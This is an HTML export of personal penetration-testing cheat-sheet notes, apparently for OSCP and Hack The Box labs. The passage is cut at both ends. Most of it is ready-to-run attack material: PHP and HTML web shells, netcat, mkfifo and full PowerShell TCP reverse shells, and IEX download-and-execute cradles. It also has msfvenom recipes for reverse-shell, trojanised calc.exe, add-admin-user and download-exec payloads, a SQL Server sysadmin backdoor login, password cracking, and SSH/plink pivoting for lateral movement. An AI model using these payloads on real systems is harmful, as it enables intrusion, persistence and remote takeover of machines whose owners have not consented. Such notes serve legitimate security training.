/>&lt;?php<br />phpinfo();                                          see what functions are allowed and blocked<br />?&gt;<br /><br />&lt;?php<br />echo shell_exec(whoami);<br />?&gt;<br /><br />&lt;?php<br />echo exec(whoami);<br />?&gt;<br /><br />&lt;?php<br />echo system(whoami);<br />?&gt;<br /><br /><br />&lt;?php echo system($_REQUEST[&#39;coolhand&#39;]); ?&gt;                   navigate to <a href="http://hostname/dir/filename.php?coolhand=whoami">http://hostname/dir/filename.php?coolhand=whoami</a><br />&lt;?php echo shell_exec($_REQUEST[&#39;coolhand&#39;]); ?&gt;<br />&lt;?php echo exec($_REQUEST[&#39;coolhand&#39;]); ?&gt;<br /></div><div class='page'><h1 class='title level-4'>html webshell</h1><br/>&lt;HTML&gt;&lt;BODY&gt;<br />&lt;FORM METHOD=&quot;GET&quot; NAME=&quot;myform&quot; ACTION=&quot;&quot;&gt;<br />&lt;INPUT TYPE=&quot;text&quot; NAME=&quot;cmd&quot;&gt;<br />&lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Send&quot;&gt;<br />&lt;/FORM&gt;<br />&lt;pre&gt;<br />&lt;?php<br />if($_GET[&#39;cmd&#39;]) {<br />      system($_GET[&#39;cmd&#39;]);<br />        }<br />?&gt;<br />&lt;/pre&gt;<br />&lt;/BODY&gt;&lt;/HTML&gt;<br /><br /><br /><br />curl <a href="http://10.10.10.97:8808/3232.php?cmd=nc.exe+-e+cmd.exe+10.10.14.3+3232">http://10.10.10.97:8808/3232.php?cmd=nc.exe+-e+cmd.exe+10.10.14.3+3232</a></div><div class='page'><h1 class='title level-3'>PowerShell</h1><br/>powershell.exe -ep bypass -c import-module .\PowerUp.ps1; Invoke-AllChecks<br /><br /><br />echo IEX(New-Object Net.WebClient).downloadString(&#39;<a href="http://10.10.14.60/80/sherlock.ps1')">http://10.11.0.186:8000/PowerUp.ps1&#39;)</a>  | powershell -noprofile -<br /><br /><br />C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile(&#39;<a href="http://10.11.0.186/lse.sh','C:\HFS\sac\lllll.sh')">http://10.11.0.186/lse.sh&#39;,&#39;C:\HFS\sac\lse.sh&#39;)</a><br /><br /><br />powershell.exe -exec Bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;<a href="http://10.11.0.186/Sherlock.ps1')"">http://10.11.0.186/Sherlock.ps1&#39;)&quot;</a> </div><div class='page'><h1 class='title level-3'>sql</h1><br/><br />do you have mysql credentials? <br />mysql -u root -p<br />password: asdfsdafsdaf<br />\! /bin/sh                                   &lt;&lt;&lt;&lt;&lt;&lt;drop you to shell<br /><br />show databases;                     to see available databases<br />use exampledb;                      to attach to example db<br />show tables;                            to see available tables<br />select * from users;                read everything from the users table<br /><br /><br /> mysql -u root -p -h 192.168.38.43<br /> <br /> <br /> <br /> <br /> <div class="codebox"><div class="codebox">SELECT&nbsp;name&nbsp;FROM&nbsp;master.dbo.sysdatabases&nbsp;#Get&nbsp;databases<br />SELECT&nbsp;*&nbsp;FROM&nbsp;&lt;databaseName&gt;.INFORMATION_SCHEMA.TABLES;&nbsp;#Get&nbsp;table&nbsp;names<br />#List&nbsp;users<br />select&nbsp;sp.name&nbsp;as&nbsp;login,&nbsp;sp.type_desc&nbsp;as&nbsp;login_type,&nbsp;sl.password_hash,&nbsp;sp.create_date,&nbsp;sp.modify_date,&nbsp;case&nbsp;when&nbsp;sp.is_disabled&nbsp;=&nbsp;1&nbsp;then&nbsp;&#39;Disabled&#39;&nbsp;else&nbsp;&#39;Enabled&#39;&nbsp;end&nbsp;as&nbsp;status&nbsp;from&nbsp;sys.server_principals&nbsp;sp&nbsp;left&nbsp;join&nbsp;sys.sql_logins&nbsp;sl&nbsp;on&nbsp;sp.principal_id&nbsp;=&nbsp;sl.principal_id&nbsp;where&nbsp;sp.type&nbsp;not&nbsp;in&nbsp;(&#39;G&#39;,&nbsp;&#39;R&#39;)&nbsp;order&nbsp;by&nbsp;sp.name;<br />#Create&nbsp;user&nbsp;with&nbsp;sysadmin&nbsp;privs<br />CREATE&nbsp;LOGIN&nbsp;hacker&nbsp;WITH&nbsp;PASSWORD&nbsp;=&nbsp;&#39;P@ssword123!&#39;<br />sp_addsrvrolemember&nbsp;&#39;hacker&#39;,&nbsp;&#39;sysadmin&#39;</div></div></div><div class='page'><h1 class='title level-4'>.sql</h1><br/>cat website.sql | grep &quot;Table structure for table&quot;<br />cat website.sql | grep -A 45 &quot;Table structure for table \`users_field_data\`&quot;</div><div class='page'><h1 class='title level-2'>Self-Signing</h1><br/><a href=""><img src="images/1139-1.png" alt="images/1139-1.png" /></a></div><div class='page'><h1 class='title level-2'>shadow</h1><br/>unshadow 141passwd 141shadow &gt; 141hash<br />john --wordlist=/Yeet/Tools/Wordlists/rockyou.txt 141hash<br /><br /><br /><a href=""><img src="images/1065-1.png" alt="images/1065-1.png" /></a></div><div class='page'><h1 class='title level-2'>Tunnels</h1><br/><table class="table"><tr><th>Box                      </th><th>IP                        </th><th>UserName</th></tr><tr><td>Kali</td><td>192.168.23.144</td><td>root</td></tr><tr><td>Ubuntu</td><td>192.168.20.117</td><td>root</td></tr><tr><td>Win10</td><td>192.168.23.169</td><td>bryan</td></tr><tr><td>Debian</td><td>192.168.21.122</td><td>squid</td></tr></table></div><div class='page'><h1 class='title level-3'>Forward (local) SSH</h1><br/>#Connect the target internal port 2222 to kali via 127.0.0.1:1111<br />ssh -p 22 bryan@192.168.1.2 -L 127.0.0.1:1111:127.0.0.1:2222<br /><a href=""><img src="images/1575-1.png" alt="images/1575-1.png" /></a><br /><br />#Connect the remote box 192.168.23.169 port 22 via an ssh connection to 192.168.20.117. <br />ssh -p 22 root@192.168.20.117 -L 127.0.0.1:1111:192.168.23.169:22<br /><a href=""><img src="images/1575-2.png" alt="images/1575-2.png" /></a><br /><br />#Jump from 192.168.20.117 to 192.168.21.122 to 192.168.23.169 and ssh in via kali 127.0.0.1:1111.<br />ssh -p 22 root@192.168.20.117 -L 127.0.0.1:1111:192.168.21.122:22<br />ssh -p 1111 squid@127.0.0.1 -L 127.0.0.1:2222:192.168.23.169:22<br />ssh -p 2222 bryan@127.0.0.1<br />                                           <br /><a href=""><img src="images/1575-3.png" alt="images/1575-3.png" /></a><br /><br />#Jump from 192.168.21.122 to 192.168.23.169 to 192.168.20.117 and ssh in via kali.<br />ssh -J squid@192.168.21.122:22,bryan@192.168.23.169 root@192.168.20.117<br /><a href=""><img src="images/1575-4.png" alt="images/1575-4.png" /></a><br /><br /></div><div class='page'><h1 class='title level-3'>Reverse SSH</h1><br/>Probably needed fix for reverse ssh tunneling through ens33 port on linux box:<br />	vim /etc/ssh/sshd_config<br />	&gt;append at the bottom&gt;GatewayPorts clientspecified<br />	service sshd restart<br /><br />#Target initiates session to kali via 127.0.0.1:2222 (redirector)<br /> ssh -p 22 root@ubuntu -R 127.0.0.1:2222:127.0.0.1:1111<br /><a href=""><img src="images/1576-1.png" alt="images/1576-1.png" /></a><br /><br />#Use 192.168.20.117 as a redirector to connect to 192.168.21.122<br />ssh -p 22 root@192.168.20.117 -R 192.168.20.117:2222:127.0.0.1:1111<br />ssh squid@192.168.21.122<br />nc -nlv 127.0.0.1 -p 1111<br />nc 192.168.20.117 2222<br /><a href=""><img src="images/1576-2.png" alt="images/1576-2.png" /></a></div><div class='page'><h1 class='title level-3'>Proxychains</h1><br/>Edit in /etc/proxychains.conf<br /><br />#Use proxychains to nc into the 192.168.20.117, making it appear as if the connection came from 192.168.21.122<br />ssh root@192.168.20.117<br />nc -nlv 192.168.20.117 1111<br />ssh -p 22 squid@192.168.21.122 -D 127.0.0.1:9050<br />proxychains nc 192.168.20.117 1111<br /><a href=""><img src="images/1577-1.png" alt="images/1577-1.png" /></a></div><div class='page'><h1 class='title level-3'>Plink</h1><br/>C:\Inetpub\wwwroot&gt;plink -R 445:localhost:445 root@10.11.0.186<br />plink -R 445:localhost:445 root@10.11.0.186<br />The server&#39;s host key is not cached in the registry. You<br />have no guarantee that the server is the computer you<br />think it is.<br />The server&#39;s rsa2 key fingerprint is:<br />ssh-rsa 2048 f6:31:96:73:5a:e1:e2:e9:c7:2b:51:61:f1:53:c5:31<br />If you trust this host, enter &quot;y&quot; to add the key to<br />PuTTY&#39;s cache and carry on connecting.<br />If you want to carry on connecting just once, without<br />adding the key to the cache, enter &quot;n&quot;.<br />If you do not trust this host, press Return to abandon the<br />connection.<br />Store key in cache? (y/n) y<br />root@10.11.0.186&#39;s password: toor<br /><br /><br /><br />plink -R 445:localhost:445 root@kaliip      to <strong>forward 445</strong> traffic on the <strong>localhost </strong>to <strong>open</strong> 445 to <strong>10.11.0.186</strong>   <br />nmap -p 445 127.0.0.1</div><div class='page'><h1 class='title level-3'>netsh</h1><br/>#Must be admin to use netsh<br />#View current port proxies<br />netsh interface portproxy show all<br /><br />#Create a portproxy<br />netsh interface portproxy set v4tov4 listenport=3232 connectaddress=github.com connectport=443 protocol=tcp<br />#could be used to expose internal port#<br /><br />#Verify portproxy is listening<br />netstat -nato | findstr 3232<br /><br />#View portproxy in reg<br />reg query hklm\system\currentcontrolset\services\portproxy /s<br /><br />#Delete a portproxy<br />netsh interface portproxy delete v4tov4 listenport=3232 protocol=tcp<br />netsh interface portproxy delete v4tov4 listenport=10500 listenaddress=192.168.0.9 protocol=TCP<br /><br /><br /><br /><br /><br />netsh interface portproxy delete v4tov4 listenport=10300 listenaddress=192.168.0.12 protocol=TCP</div><div class='page'><h1 class='title level-3'>msf portfwd</h1><br/>#to utilize second nic<br />route<br />portfwd add -L 127.0.0.1 -l 3232 -r 192.168.1.2<br /><br />#to expose local port on a target<br />portfwd add -L 127.0.0.1 -l 4450 -r 127.0.0.1 -p 445<br />portfwd add -L 127.0.0.1 -l 1350 -r 127.0.0.1 -p 135<br />nmap -p 1350,4450 -sv -sT -Pn -n --open 127.0.0.1</div><div class='page'><h1 class='title level-3'>OSCP Tunneling Notes</h1><br/>C:\Inetpub\wwwroot&gt;plink -R 445:localhost:445 root@10.11.0.186<br />plink -R 445:localhost:445 root@10.11.0.186<br />The server&#39;s host key is not cached in the registry. You<br />have no guarantee that the server is the computer you<br />think it is.<br />The server&#39;s rsa2 key fingerprint is:<br />ssh-rsa 2048 f6:31:96:73:5a:e1:e2:e9:c7:2b:51:61:f1:53:c5:31<br />If you trust this host, enter &quot;y&quot; to add the key to<br />PuTTY&#39;s cache and carry on connecting.<br />If you want to carry on connecting just once, without<br />adding the key to the cache, enter &quot;n&quot;.<br />If you do not trust this host, press Return to abandon the<br />connection.<br />Store key in cache? (y/n) y<br />root@10.11.0.186&#39;s password: toor<br /><br /><br /><br />plink -R 445:localhost:445 root@kaliip      to <strong>forward 445</strong> traffic on the <strong>localhost </strong>to <strong>open</strong> 445 to <strong>10.11.0.186</strong>   <br />nmap -p 445 127.0.0.1<br /><br /><br />nano /etc/proxychains.conf<br />socks4 127.0.0.1 6969<br />ssh -D 127.0.0.1:6969 remoteusername@remoteip<br />proxychains nmap remoteip<br /><br /><br /></div><div class='page'><h1 class='title level-4'>rinetd</h1><br/>       internet<br />       <br />       computer that can reach both internet and hidden (middle guy)<br />       <br />       hidden<br /><br /><br />on middle guy<br />    bindaddress always equals 0.0.0.0 (so it can be connected to by any machine)<br />    bindport is the port that “hidden” will be connecting to middle guy on<br />    connectaddress is the ip that hidden will be forwarded to<br />    connectport is the port that hidden will be forwarded to<br />    <br />    service rinetd restart<br /><a href=""><img src="images/1131-1.png" alt="images/1131-1.png" /></a><br /><br />hidden<br />    nc -nvv “middle guy ip” “middle guy connectport”<br />    <a href=""><img src="images/1131-2.png" alt="images/1131-2.png" /></a></div><div class='page'><h1 class='title level-4'>ssh local port forwarding</h1><br/>    kali<br />    <br />    middle guy<br />    <br />    hidden<br />    <br />    <br />on kali<br />    0.0.0.0 = bind ip (always keep to 0.0.0.0)<br />    445      = bind port (set this to the port you want to be able to reach &quot;localy&#39;<br />    172.16.167.5 = hidden ip<br />    445               = distant port you want to forward<br />    root@192.168.167.44  = login of middle guy<br /><a href=""><img src="images/1132-1.png" alt="images/1132-1.png" /></a><br /><a href=""><img src="images/1132-2.png" alt="images/1132-2.png" /></a></div><div class='page'><h1 class='title level-4'>ssh Remote Port Forwarding</h1><br/>If you can access a port from a machine locally, but not from the distant kali machine...<br /><br />on the target<br />    kaliIP:KaliPort:localhost:PortToForward login@kaliIP<br /><a href=""><img src="images/1133-1.png" alt="images/1133-1.png" /></a><br /><br /><br /><a href=""><img src="images/1133-2.png" alt="images/1133-2.png" /></a></div><div class='page'><h1 class='title level-4'>ssh dynamic port forwarding</h1><br/>on kali<br />    nano /etc/proxychains<br />        socks4 127.0.0.1 9050<br />    ssh -N -D 127.0.0.1:9050 root@middleguyIP<br />on kali in seperate term<br />    proxychains nmap -sT -Pn HiddenIP </div><div class='page'><h1 class='title level-4'>plink</h1><br/>Used to forward a port from a windows box that would normally only be seen localy.<br /><br />1. Transfer plink.exe to the windows<br />2. cmd.exe /c echo y | plink.exe -ssh -l root -pw toortoor -R KaliIP:KaliPort:127.0.0.1:PortToForward KaliIp<br />    <a href=""><img src="images/1135-1.png" alt="images/1135-1.png" /></a><br />3. verify port accessability<br />    <a href=""><img src="images/1135-2.png" alt="images/1135-2.png" /></a><br /><br /><br /><br /><br />This useage is to forward a rev shell from a hidden DC that when executed reaches to a windows 10 machine over port 4444 and is then forwarded to 192.168.119.167 (kali) on port 4444 to handle the shell with nc -nlvp 4444<br /><br />cmd /c echo y | plink.exe -N -L 0.0.0.0:PortRecieving:KaliIP:KaliPort user@kaliIP<br /><a href=""><img src="images/1135-3.png" alt="images/1135-3.png" /></a><br /><a href=""><img src="images/1135-4.png" alt="images/1135-4.png" /></a></div><div class='page'><h1 class='title level-3'>Multiplexing</h1><br/>ssh -M -S /tmp/t1 -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null bob@40.0.0.101<br />ssh -S /tmp/t1 dummy@127.0.0.1 (dummy@127.0.0.1 is just a placeholder. does nothing)<br /><br /><br />scp -o ControlPath=/tmp/t1 dummy@127.0.0.1:/home/bob/room/lp.py /root/Desktop/<br /><br /><br />ssh -S /tmp/t1 dummy@127.0.0.1 -O forward -R5157:127.0.0.1:4444<br />ssh -S /tmp/t1 dummy@127.0.0.1 -O cancel -R5157:127.0.0.1:4444<br /><br /><br />You will only use Reverse if something is beaconing out of the target and you want to catch it.<br /><br />scp -o ControlPath=/tmp/t5 dummy@127.0.0.1:&quot;\&quot;C:\Users\hugh.payne\My Documents\smbserver notes.rtf\&quot;&quot; .<br />scp -r -o ControlPath=/tmp/t2 dummy@127.0.0.1:&quot;\&quot;C:\windows\prefetch\&quot;&quot; .<br /><br /><br />if you need to sudo...<br />ssh user@ip &quot;cat file&quot; &gt; file.txt<br /><br /><br /><br /><br />scp -o ControlPath=/tmp/t5 -T &#39;student12@127.0.0.1:&quot;C:\Program Files\Common Files\system\ado\*.dll&quot;&#39; T5_ADO<br /><br />scp -r -o ControlPath=/tmp/t2 dummy@127.0.0.1:&quot;\&quot;C:\windows\prefetch\*.dll&quot;&quot; .</div><div class='page'><h1 class='title level-4'>Class Notes</h1><br/>-&gt; host1<br />--&gt; host2<br />----&gt; host3<br /><br />host1<br />----------<br />ssh user@host1 -M -S /tmp/host1.sock #Multiplexed<br /><br />ssh user@host1 -S /tmp/host1.sock #Interactive<br /><br />#Create tunnel associated with Multiplexed socket /tmp/host1.sock Kali port 2222 going through host to port 22<br />ssh user@host1 -S /tmp/host1.sock -O forward -L2222:host2:22 # noninteractive<br />ssh user@host1 -S /tmp/host1.sock -L2222:host2:22 # interactive<br /><br />ssh user@host -S /tmp/host1.sock -O forward -R32123:127.0.0.1:4444 # noninteractive REMOTE listener to local nc on 4444<br />nc -lp 4444<br />ssh user@host -S /tmp/host1.sock -O cancel -R32123:127.0.0.1:4444 # noninteractive CLOSE REMOTE listener<br /><br /><br />host2<br />----------<br />ssh user@127.0.0.1 -p 2222 -M -S /tmp/host2.sock # Multiplexed<br /><br />ssh user@127.0.0.1 -p 2222 -S /tmp/host2.sock # Interactive<br /><br />ssh user@127.0.0.1 -p 2222 -S /tmp/host2.sock -L3333:host3:22 # interactive forward tunnel for connecting to next host<br /><br />host3<br />-----------<br />ssh user@127.0.0.1 -p 3333 -M -S /tmp/host3.sock # Multiplexed<br /><br />ssh user@127.0.0.1 -p 3333 -S /tmp/host3.sock # Interactive</div><div class='page'><h1 class='title level-1'>Quick Commands</h1><br/><br /></div><div class='page'><h1 class='title level-2'>awk/sed</h1><br/>awk &#39;{print $1, $2, $3}&#39; shellcode.txt                                                                                   to print field 1, 2, and 3<br />awk &#39;{print $3}&#39; shellcode.txt | while read line; do echo $line; done                                        to loop through each line of field 3<br />awk &#39;{print $3}&#39; shellcode.txt | while IFS=b read junk line; do echo $line; done &gt; 3.txt        to remove all charachters before and including “b” in field 3 then writing to 3.txt<br />awk ‘{print “buf += ”$1}’ 3.txt &gt; finalshellcode.txt                                                             to print the string “buf += ” then the field of 3.txt and write into finalshellcode.txt<br /><br /><br /><br /><br /><br /><br />cat oracle-betterdefaultpasslist.txt | sed &#39;s/.*://&#39; &gt; passwords.txt<br />                                                             ^<br />s means regex, / opens, .* anything including nothing,: is the deliminating charachter, // is close. <br />This will remove charchters before the :                                                <br />                     <br />                     sed &#39;s/:.*//&#39;      will remove charachters after the : <br />                     <br /><br /><br />sed -z &#39;s/\n//g&#39;<br />removes line brakes and turns code all into one line</div><div class='page'><h1 class='title level-2'>curl</h1><br/>curl <a href="http://sickos/test/">http://sickos/test/</a> --upload-file /tmp/.curl.php -v<br /><br /><br /><br /><br /><br /><code>curl -s --data &quot;&lt;?system(&#39;whoami&#39;);?&gt;&quot; &quot;http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00&quot;</code></div><div class='page'><h1 class='title level-2'>encodeing</h1><br/>cat reverse.ps1 | iconv -t UTF-16LE | base64 -w0 | xclip -selection clipboard       &lt; base64 encodes script and copies to clipboard!</div><div class='page'><h1 class='title level-2'>git</h1><br/>git config user.email &quot;chrischmid32@gmail.com&quot;<br />git config user.name &quot;coolhandsquid&quot;<br /><br /><br />create a branch<br />	git push -u origin develop<br />	<br />Check what branch<br />	git checkout<br />	<br />Prep for push<br />	git add file.py<br />	git commit -m “comment here”<br />	git push origin &lt;branchname&gt;</div><div class='page'><h1 class='title level-2'>grep/select-string</h1><br/>grep -r “flag[23]”                                          will search recursively for flag2 or flag3 string <br />-A 32 for the trailing 32 lines after a hit<br />-v remove this string from results<br /><br /><br /><br /><br />get-childitem -recurse | get-content | select-string &#39;alice&#39;<br /><br />dir /s flag*</div><div class='page'><h1 class='title level-2'>msfvenom</h1><br/>msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.60 LPORT=3232 -f raw -o PhpShell.php<br /><br />msfvenom -p windows/shell_reverse_tcp lhost=10.11.0.186 lport=443 -f asp -a x86 --platform win  &gt; Shell.asp<br /><br />msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.60 lport=3234 -f aspx -a x86 --platform win  &gt; 3234.aspx<br /><br />msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.186 LPORT=443 -f raw &gt; 443.jsp<br /><br />msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.60 lport=3235 -f exe --platform windows -a x86 -o 3235.exe -e x86/shikata_ga_nai -i 18<br /><br />msfvenom -p windows/shell_reverse_tcp lhost=192.168.11.21 lport=443 -f vba &gt; 443-21.vba<br /><br />msfvenom -p java<strong>/</strong>jsp_shell_reverse_tcp LHOST=192.168.119.167 LPORT=443 -f war <strong>&gt;</strong> 443.war<br /><br />msfvenom --list payloads<br /><br />VVwill run the commandVV<br />msfvenom -p windows/exec CMD=&quot;net user squid 12qwaszx!@QWASZX /add&quot; -f exe -o yeet.exe<br />msfvenom -p windows/exec CMD=&#39;net localgroup administrators bill /add&#39; -f exe -o Advanced.ex<br /><br />VVdownloads and executes file from url (http or ftp).<br />msfvenom -p windows/download_exec URL=http://yee.wtf/yeet.exe -f exe -o dandy.exe<br /><br />VVmakes an exe from a templateVV “very cool” “Shell7er like”<br />msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -x /root/calc.exe LHOST=ens192 LPORT=443 -o badcalc.exe</div><div class='page'><h1 class='title level-2'>nc</h1><br/>nc -nlvp 3232<br />C:\users\mssql-svc\Desktop\nc.exe 10.10.14.8 3232 -e cmd.exe<br /><br /><br />nc 192.168.11.137 39830<br />    connect to 39830 on remote machine .137<br />    <br />rlwrap nc -nlvp 3232<br /><br /><br /></div><div class='page'><h1 class='title level-3'>ubuntu</h1><br/>Ubuntu with wierd NC<br /><br />on Target<br />rm -f /tmp/f; mkfifo /tmp/f &amp;&amp; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 192.168.119.132 80 &gt; /tmp/f<br /><br />on kali<br />nc -nlvp 3232</div><div class='page'><h1 class='title level-2'>nmap</h1><br/>nmap -sC -sV -p- -oN Nmap.txt 10.10.10.29                                                                   &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;<br /><br />nmap -p 445 --script &quot;safe&quot; -Pn -n -oN Blue_Safe.txt 10.10.10.40<br /><br />nmap -sV -T4 -p- -oN Mirai.nmap2 10.10.10.48 <br /><br /><code>nmap -v -sV -p- --script vuln -T4 10.10.10.48</code>                                               &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;<br /><br />nmap --script smb-vuln* -p 139,445 10.10.10.40<br /><br />nmap -Pn -sV -p 995 -vv --script=ssl* 10.11.1.22</div><div class='page'><h1 class='title level-3'>port Knock</h1><br/>nmap -r -p 1,2,3  192.168.11.252                        &lt;&lt;&lt;&lt; portknocks 1 2 3 in order</div><div class='page'><h1 class='title level-2'>recursive read</h1><br/>find . -type f | xargs -I {} cat {}<br /></div><div class='page'><h1 class='title level-2'>Shell Fix</h1><br/>                        SHELL FIX<br />cat /etc/shells<br /><br />python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;);&#39;<br />python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;);&#39;<br />python -c &#39;import pty;pty.spawn(&quot;/bin/sh&quot;);&#39;<br />                    now you can delete and move cursor<br /><br />control z<br />stty raw -echo<br />fg           you will be blind<br />                    now you can tab complete<br />export TERM=screen<br />                        now you can clear screen<br /><br />??Can&#39;t VI??<br />    stty -a (in a kali terminal)<br />    (annotate row and column numbers)<br />    stty rows 34 columns 137<br />    <br />??stuck in debug??                        <br />msfconsole<br />use exploit/multi/script/web_delivery                    <br /><a href="https://www.hackingarticles.in/misdirection-1-vulnhub-walkthrough/">https://www.hackingarticles.in/misdirection-1-vulnhub-walkthrough/</a>            <br />                        <br />??Shell super fucked??<br />msfvenom -p cmd/unix/reverse_python lhost=192.168.1.110 lport=3233 R<br />^^From here I&#39;d recomend going through the original fixes again (python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;);&#39;    and so on)<br />                       <br />                        <br />~rbash oneliner <br />    for line in $(&lt;flag3.txt); do echo &quot;$line&quot;; done;<br />    <br />    <br />----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------    <br />    <br />powershell.exe -exec Bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;<a href="http://10.11.0.186:8032/Invoke-PowershellTcp.ps1')"">http://10.11.0.186:80/Invoke-PowerShellTcp.ps1&#39;)&quot;</a><br />   <br /></div><div class='page'><h1 class='title level-3'>powershell One-liner</h1><br/>if in cmd<br /><br />powershell -nop -exec bypass -c &quot;$client = New-Object System.Net.Sockets.TCPClient(&#39;10.10.14.60&#39;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;<br /><br /><br />if in powershell<br /><br />$client = New-Object System.Net.Sockets.TCPClient(&#39;10.10.14.60&#39;,443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()<br /></div><div class='page'><h1 class='title level-3'>Spawning a TTY</h1><br/>python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;<br /><br />echo os.system(&#39;/bin/bash&#39;)<br /><br />/bin/sh -i<br /><br />perl -e &#39;exec &quot;/bin/sh&quot;;&#39;<br /><br />perl: exec &quot;/bin/sh&quot;;<br /><br />ruby: exec &quot;/bin/sh&quot;<br /><br />lua: os.execute(&#39;/bin/sh&#39;)<br /><br />exec &quot;/bin/sh&quot;<br /><br />:!bash      (From within vi)<br /><br />:set shell=/bin/bash:shell		(from within vi)<br /><br />!sh 			(from within nmap)<br /><br /></div><div class='page'><h1 class='title level-2'>sudo/su</h1><br/>sudo -u jens /home/jens/backups.sh<br /><br />su -l adminface </div><div class='page'><h1 class='title level-2'>tail</h1><br/>tail -f yeet.txt</div><div class='page'><h1 class='title level-2'>tcpdump</h1><br/>set up your rce to run : ping -c 1 &lt;attacker ip&gt;<br />running on your attack box: tcpdump -i tun0 icmp <br /></div><div class='page'><h1 class='title level-2'>tmux</h1><br/>tmux new -s yeet -d<br />tmux ls<br />tmux attach -t yeet (tmux a -t yeet)<br /><br />tmux kill-session -t yeet<br />tmux kill-session -t yeet -a (kill all sessions except yeet)<br />tmux kill-server	(kill all sessions)<br /><br /><table class="table"><tr><th>Function                               </th><th>Ctrl B ...     </th></tr><tr><td>Sessions</td><td> </td></tr><tr><td>Detach Session</td><td>d</td></tr><tr><td>Rename Session</td><td>$</td></tr><tr><td>Switch Between Sessions</td><td>s</td></tr><tr><td>Panes</td><td> </td></tr><tr><td>Split Horizontal</td><td>&quot;</td></tr><tr><td>Split Vertical</td><td>%</td></tr><tr><td>Switch Pane</td><td>arrows</td></tr><tr><td>Kill Pane</td><td>x</td></tr><tr><td>Rotate Panes </td><td>{ or }</td></tr><tr><td>Cycle suggested</td><td>SpaceBar</td></tr><tr><td>Show Pane Numbers</td><td>q</td></tr><tr><td>Windows</td><td> </td></tr><tr><td>New Window</td><td>c</td></tr><tr><td>Rename Window</td><td>,</td></tr><tr><td>Send Pane to Own Window</td><td>!</td></tr><tr><td>Switch between ALLL Windows</td><td>w</td></tr><tr><td>Kill windows</td><td>&amp;</td></tr><tr><td> </td><td> </td></tr></table><br /><br /><table class="table"><tr><th>Function                            </th><th>Ctrl B : ...                                                       </th></tr><tr><td>Change tmux dir</td><td>attach -c /dev/shm (a -c /dev/shm)</td></tr><tr><td>Swap pane locations</td><td>swap-pane -s 3 -t 2</td></tr><tr><td>Send Pane to Window</td><td>join-pane -t windowname</td></tr><tr><td> </td><td> </td></tr><tr><td> </td><td> </td></tr><tr><td> </td><td> </td></tr><tr><td> </td><td> </td></tr><tr><td> </td><td> </td></tr><tr><td> </td><td> </td></tr></table><br /><br /><a href=""><img src="images/1573-1.png" alt="images/1573-1.png" /></a></div><div class='page'><h1 class='title level-3'>Tmux (less pretty)</h1><br/>##########TMUX-ification###########<br />Start Tmux = tmux &quot;or&quot; tmux new -s YEET<br />Access a Tmux session = tmux a<br />Background a Tmux session = hotkey d<br />ctrl+b=hotkey<br />r=recursive search through history<br /><br />##########Window and Pane Control###########<br />c=new window<br />,=name window<br />%=Add a Vertical split pane<br />&quot;=Add a Horizontal split pane<br />-z=zoom and unzoom a pane<br />o=switch pane<br />q1=switch pane<br />x=kill pane<br />&amp;=kill window<br />:kill-session=kill Tmux session<br />arrow=switch pane<br />space   =cycle through pane layouts<br />hold ctrl and press arrows=adjust panes<br /><br />##########send/join pane##########<br />1. Go to the window you want the other pane to populate to<br />2. :join-pane -s 0:1        [session:window]<br />Note: Determine session with q<br /><br />##########Search with VIM##########<br />1. Enter copy mode [<br />2. Use space bar to start/stop highlighting text (this is cool becasue vim search features / $ gg G :10 n N work)<br />3. Hit ENTER, sending highlighted text to specail tmux clipboard<br />4. ] to paste.<br /><br />##########Not Tmux but important cursor stuff##########<br />CTRL e = end of line<br />CTRL a = begining of line<br />CTRL arrow = jump by word<br /><br />##########Conf File##########<br />#.tmux.conf<br />#set -g allow-rename off<br />#set-window-option -g mode-keys vi<br />#############################<br /></div><div class='page'><h1 class='title level-2'>Vim</h1><br/>za to fold and unfold into one line<br />{{{<br />yeetcannon<br />}}}<br /><br /><br /></div><div class='page'><h1 class='title level-2'>wfuzz</h1><br/><a href=""><img src="images/1591-1.png" alt="images/1591-1.png" /></a><br /><a href=""><img src="images/1591-2.png" alt="images/1591-2.png" /></a><br />wfuzz -c -z file,~/Desktop/UVW.txt jewel.uploadvulns.thm/content/FUZZ.jpeg<br />wfuzz -c -w 